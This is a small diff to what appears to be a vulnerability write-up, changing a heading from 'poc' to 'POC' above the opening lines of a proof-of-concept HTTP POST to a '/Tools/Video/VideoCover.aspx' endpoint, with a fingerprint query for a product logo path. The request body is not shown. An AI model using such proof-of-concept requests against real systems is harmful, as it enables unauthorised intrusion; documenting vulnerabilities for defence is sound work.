@@ -5,7 +5,7 @@
 body="/Upload/DomainInfo/MaxAVALogo.png"
 ```
 
-## poc
+## POC
 ```
 POST /Tools/Video/VideoCover.aspx HTTP/1.1
 Host: xxxxx
